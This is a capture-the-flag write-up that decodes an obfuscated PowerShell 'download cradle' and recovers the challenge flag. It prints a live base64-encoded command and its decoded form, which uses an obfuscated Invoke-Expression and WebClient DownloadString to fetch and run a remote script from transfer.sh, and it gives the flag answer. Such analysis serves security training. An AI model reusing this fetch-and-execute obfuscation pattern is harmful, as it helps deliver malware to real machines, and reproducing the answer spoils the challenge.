# Cradle 1 

McSkiddy considers himself a connoisseur of all things PowerShell for initial access. He even found a nifty tool that automagically obfuscates scripts! Surely with this, the secrets of his tradecraft will be known to him alone...right?

Can you prove him wrong by uncovering what this script of his does?

```
powershell -nop -enc "LgAoACIAewAwAH0AewAxAH0AIgAtAGYAJwBpACcALAAnAGUAeAAnACkAIAAoACgALgAoACIAewAwAH0AewAxAH0AewAyAH0AIgAgAC0AZgAnAE4AZQB3AC0AJwAsACcATwBiAGoAZQAnACwAJwBjAHQAJwApACAAUwB5AHMAdABgAGUAbQBbAC4AXQBuAGAARQBgAFQAWwAuAF0AdwBFAEIAYwBsAGkAYABlAG4AdAApAC4AIgBEAG8AVwBOAEwAYABvAEEARABzAGAAVABgAFIAaQBgAE4AZwAiACgAJwBoAHgAeABwAHMAWwA6AC8ALwBdAHQAcgBhAG4AcwBmAGUAcgBbAC4AXQBzAGgALwAoACgAKAAiAHsANAB9AHsAMQB9AHsAMAB9AHsANwB9AHsANgB9AHsAMgB9AHsAMwB9AHsANQB9ACIALQBmACAAJwAnAHMAZQBjACcAJwAsACcAJwB7AG4AbwB0AF8AcwBvAF8AJwAnACwAJwAnAGUAJwAnACwAJwAnAGMAcgBhAGYAdAAnACcALAAnACcAbABlAHYAZQBsAGUAZgBmAGUAYwB0ACcAJwAsACcAJwB9ACcAJwAsACcAJwB0AHIAYQBkACcAJwAsACcAJwByAGUAdABfACcAJwApACkAKQAvAGEAWwAuAF0AcABzADEAJwApACkA"
```

Intermediate 
200 points


the -enc command is short for EncodedCommand which takes a base64 string as input. now lets decode it and see what it does.
```
.("{0}{1}"-f'i','ex') ((.("{0}{1}{2}" -f'New-','Obje','ct') Syst`em[.]n`E`T[.]wEBcli`ent)."DoWNL`oADs`T`Ri`Ng"('hxxps[://]transfer[.]sh/((("{4}{1}{0}{7}{6}{2}{3}{5}"-f ''sec'',''{not_so_'',''e'',''craft'',''leveleffect'',''}'',''trad'',''ret_'')))/a[.]ps1'))
```
note: if you're using cyberchef, make sure that you decode the text as utf-16-le.

We can see the flag, now you can manually deobfuscate this.
the part we're interested in is this:

```
('hxxps[://]transfer[.]sh/((("{4}{1}{0}{7}{6}{2}{3}{5}"-f ''sec'',''{not_so_'',''e'',''craft'',''leveleffect'',''}'',''trad'',''ret_'')))/a[.]ps1'))
```
if you're familiar with programming,you know that this is a format string, I dont know the exact nuances when it comes to powershell but heres the gist of what I understand:
{number} - represents the index.
and the words after -f are the specifiers
{0} would be replaced with 'sec' ,{1} would be replaced with '{not_so' and so on.

after substituting the values, we get:

`hxxps[://]transfer[.]sh/leveleffect{not_so_secret_tradecraft}`

`flag: leveleffect{not_so_secret_tradecraft}`


